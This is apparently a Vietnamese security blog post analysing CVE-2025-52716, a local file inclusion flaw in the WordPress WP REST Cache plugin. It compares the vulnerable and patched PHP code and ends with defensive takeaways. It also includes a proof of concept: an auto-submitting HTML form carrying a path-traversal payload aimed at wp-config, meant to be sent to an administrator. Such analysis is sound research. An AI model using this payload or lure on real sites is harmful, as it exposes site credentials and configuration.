---
title: CVE-2025-52716 Analysis & POC
description: Security Vulnerability in WordPress WP REST Cache Plugin.
date: 2025-10-20 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, lfi]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **WP REST Cache** phiên bản **≤ 2025.1.0** chứa lỗ hổng **Local File Inclusion** cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh `include/require`, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.

* **CVE ID**: [CVE-2025-52716](https://www.cve.org/CVERecord?id=CVE-2025-52716)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 2025.1.0
* **Patched Versions**: 2025.1.1
* **CVSS severity**: High (7.5)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress WP REST Cache Plugin](https://wordpress.org/plugins/wp-rest-cache/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **WP REST Cache**: **2025.1.0** (vulnerable) và **2025.1.1** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

**Bản lỗi**:

```php {filename="class-admin.php v2025.1.0" hl_lines=[4,10,12]}
public function settings_page() {
    $this->settings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this->settings_panels );

    $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS );
    if ( empty( $sub ) ) {
        $sub = 'settings';
    }
    include_once __DIR__ . '/partials/header.php';
    if ( isset( $this->settings_panels[ $sub ]['template'] ) ) {
        include_once $this->settings_panels[ $sub ]['template'];
    } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) {
        include_once __DIR__ . '/partials/sub-' . $sub . '.php';
    } else {
        include_once __DIR__ . '/partials/sub-settings.php';
    }
}
```

Trong phiên bản lỗi, `$sub` là giá trị trả về của [`filter_input()`](https://www.php.net/manual/en/function.filter-input.php) lấy giá trị từ tham số GET (`?sub=...`) trong URL với filter [`FILTER_SANITIZE_FULL_SPECIAL_CHARS`](https://www.w3schools.com/php/filter_sanitize_special_chars.asp) dùng để esacape `"<>&` và các ký tự với ASCII value dưới 32. Tức không bao gồm `.(46)` và `/(47)`

`$sub` được concat vào chuỗi có `'.php'` sau cùng trước khi được `include_once` mà không có cơ chế bảo vệ trước **LFI**.

**Bản vá**:

```php {filename="class-admin.php v2025.1.1" hl_lines=[4,9,10,11,12,16,18]}
public function settings_page() {
    $this->settings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this->settings_panels );

    $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS );
    if ( empty( $sub ) ) {
        $sub = 'settings';
    }

    $potential_sub_file = __DIR__ . '/partials/sub-' . $sub . '.php';
    if ( dirname( $potential_sub_file ) !== __DIR__ . '/partials' ) {
        $sub = 'settings';
    }

    include_once __DIR__ . '/partials/header.php';
    if ( isset( $this->settings_panels[ $sub ]['template'] ) ) {
        include_once $this->settings_panels[ $sub ]['template'];
    } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) {
        include_once __DIR__ . '/partials/sub-' . $sub . '.php';
    } else {
        include_once __DIR__ . '/partials/sub-settings.php';
    }
}
```

Bản vá đã thêm cơ chế **kiểm tra vị trí file trước khi include**, đảm bảo file được nạp chỉ nằm trong thư mục `partials`. Nếu phát hiện đường dẫn ra ngoài (do chuỗi như `../`), plugin tự động chuyển về file mặc định an toàn. Nhờ đó, lỗ hổng **LFI** bị loại bỏ.

### Vulnerable Code 

`settings_page()` được đăng ký làm callback của submenu 

```php {filename="class-admin.php v2025.1.0" hl_lines=[8,9]}
add_submenu_page(
    'options-general.php',
    'WP REST Cache',
    'WP REST Cache',
    $capability,
    'wp-rest-cache',
    [
        $this,
        'settings_page',
    ]
);
```

Tức khi truy cập endpoint

```http
GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1
```

thì `settings_page()` được gọi.

## Exploit
### Proof of Concept (PoC)

#### Step 1

Tạo trang web có form, tự động gửi request với LFI payload

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="http://localhost:80//wp-admin/options-general.php" method="get">
        <input type="text" name="page" value="wp-rest-cache">
        <input type="text" name="sub" value="/../../../../../../wp-cofnig">
    </form>
    <script>
        document.forms[0].submit()
    </script>
</body>
</html>
```

#### Step 2

Gửi link đến trang web cho admin hoặc người dùng có đặc quyền

> [!WARNING]
> Lỗ hổng này chỉ khai thác được trên **Windows**, vì hàm `file_exists()` xử lý đường dẫn khác nhau giữa hai hệ điều hành. Trên **Linux**, nếu đường dẫn chứa thư mục không tồn tại, hàm sẽ trả về `false`. Trong khi đó, trên **Windows**, cùng đường dẫn đó lại có thể trả về `true`, khiến điều kiện kiểm tra bị bỏ qua và lỗ hổng có thể kích hoạt.

## Conclusion

Phiên bản **≤ 2025.1.0** của WP REST Cache cho phép **Local File Inclusion** qua tham số `sub`. Bản vá **2025.1.1** giải quyết bằng cách kiểm tra vị trí file trước khi include — đảm bảo file chỉ được nạp nếu nằm trong thư mục `partials`, từ đó loại bỏ khả năng path traversal/LFI.

## Key takeaways

* Lấy dữ liệu trực tiếp từ request và ghép vào đường dẫn file là rủi ro LFI.
* Luôn xác thực **vị trí thực tế** của file (đường dẫn tuyệt đối) trước khi include.
* Kiểm soát phạm vi file bằng so sánh thư mục đích (whitelist) hiệu quả hơn chỉ sanitize ký tự.
* Kiểm tra trên nhiều nền tảng (Windows/Linux) vì hành vi hàm file có thể khác nhau.

## References

[File Inclusion/Path traversal — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress WP REST Cache Plugin <= 2025.1.0 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/wp-rest-cache/vulnerability/wordpress-wp-rest-cache-2025-1-0-local-file-inclusion-vulnerability)
